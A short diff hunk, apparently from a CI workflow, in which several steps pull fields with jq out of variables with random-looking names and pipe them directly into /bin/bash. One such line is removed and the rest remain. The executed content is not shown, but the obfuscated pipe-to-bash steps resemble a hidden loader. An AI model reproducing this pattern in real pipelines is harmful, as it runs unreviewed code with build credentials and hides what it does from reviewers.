@@ -32,7 +32,6 @@ jobs:
           echo $waox9 | jq -r .viss0 | /bin/bash
           echo $y04596 | jq -r .r25538 | /bin/bash
           printf '%s' "$gpocb42" | jq -r .vpzdb8 | /bin/bash
-          printf '%s' "$ojex6" | jq -r .b7 | /bin/bash
           printf '%s' "$kodp61206" | jq -r .xa668 | /bin/bash
 
       - name: Save data
